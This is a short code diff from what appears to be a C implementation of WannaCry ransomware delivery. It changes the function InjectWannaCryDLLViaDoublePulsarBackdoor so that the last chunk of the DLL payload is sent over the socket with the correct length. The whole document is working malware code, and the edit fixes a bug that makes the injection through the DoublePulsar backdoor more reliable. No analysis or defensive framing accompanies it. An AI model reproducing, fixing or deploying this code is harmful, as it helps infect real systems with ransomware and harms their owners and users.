@@ -305,7 +305,7 @@ int InjectWannaCryDLLViaDoublePulsarBackdoor(SOCKET s, int architectureType, int
 		memcpy(send_buffer + 70 , Parametersbuffer, 12);
 		//copy last payload size = bytesLeft
 		memcpy(send_buffer + 82, (char *)hMem + ctx, bytesLeft);
-		send(socket, (char*)send_buffer, 4178, 0);
+		send(socket, (char*)send_buffer, bytesLeft+82, 0);
 		recv(socket, (char*)recv_buffer, 4096, 0);
 	}
 	//This part of the code is for debug purposes
